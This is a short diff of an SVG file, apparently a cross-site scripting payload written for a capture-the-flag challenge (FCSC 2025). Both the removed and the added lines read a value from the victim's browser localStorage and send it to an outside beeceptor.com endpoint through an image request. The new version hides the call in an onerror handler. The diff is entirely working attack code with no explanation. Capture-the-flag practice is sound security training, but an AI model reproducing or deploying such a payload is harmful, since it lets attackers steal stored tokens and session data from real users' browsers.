@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    new Image().src = 'https://fcsc2025lafeuille.free.beeceptor.com/?flag=' + localStorage.flag; 
+    <image href="x" onerror="this.href.baseVal='';new Image().src='https://fcsc2025lafeuille.free.beeceptor.com/?flag='+localStorage.flag" /> 
   </script>
 </svg>
